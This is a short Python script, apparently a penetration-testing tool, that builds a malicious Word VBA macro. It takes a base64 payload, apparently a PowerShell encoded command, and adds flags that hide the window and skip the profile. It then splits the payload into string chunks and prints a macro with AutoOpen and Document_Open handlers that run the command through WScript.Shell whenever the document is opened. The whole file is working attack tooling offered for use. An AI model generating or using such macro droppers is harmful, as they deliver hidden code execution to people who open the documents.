#!/usr/bin/python

#Import Libraries
import sys
import os 

#Verify the numbers of arguments
if len(sys.argv) < 2:
	print("[!] Use: python " + sys.argv[0] + " <payload-based64>")
	sys.exit(0)

#Saved the argument as a variable
str = sys.argv[1]

#Insert the additional arguments needed for the payload
payload= str[:10] + ".exe -nop -w hidden " + str[11:]

#Split the payload in blocks of 50 characters
#payloadSplit = ""
payloadSplit = ""
n = 50
for i in range(0, len(payload), n):
    	payloadSplit += "	Str = Str + " + '"' + payload[i:i+n] + '"\r\n'

################################################################################

#Macro Generator
Lines = "-" * 100 
Macro = "Sub AutoOpen()\r\n"
Macro += "	MyMacro\r\n"
Macro += "End Sub\r\n"
Macro += "Sub Document_Open()\r\n"
Macro += "	MyMacro\r\n"
Macro += "End Sub\r\n"
Macro += "Sub MyMacro()\r\n"
Macro +=  "	Dim Str As String\r\n"
Macro += payloadSplit
Macro += "\r\n"
Macro += "	CreateObject(\"Wscript.Shell\").Run Str\r\n"
Macro += "End Sub"

os.system("clear")
print("************ MACRO PAYLOAD GENERATED ************")
print(Lines)
print(Macro)
print(Lines)
print("[!!] IMPORTANT: Use the macro name 'MyMacro' when is being created in Word")
